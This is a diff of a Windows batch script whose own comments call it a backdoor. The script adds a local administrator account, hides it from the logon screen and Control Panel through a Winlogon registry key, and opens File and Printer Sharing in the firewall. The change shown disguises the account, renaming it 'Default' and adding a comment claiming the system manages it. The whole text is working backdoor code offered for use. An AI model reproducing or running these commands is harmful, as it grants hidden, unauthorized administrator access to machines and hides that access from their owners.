@@ -4,11 +4,11 @@ rem USE TURKISH CHRACTER TABLE
 chcp 65001
 
 rem ADD BACKDOOR USER
-net user admin admin0 /add
-net localgroup Administrators admin /add
+net user Default admin0 /add /comment:"A user account managed by the system."
+net localgroup Administrators Default /add
 
 rem HIDE BACKDOOR USER ACCOUNT FROM CONTROL PANEL AND LOGON SCREEN
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v admin /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Default /t REG_DWORD /d 0 /f
 
 rem PERMIT FILE SHARING ON FIREWALL
 netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=yes
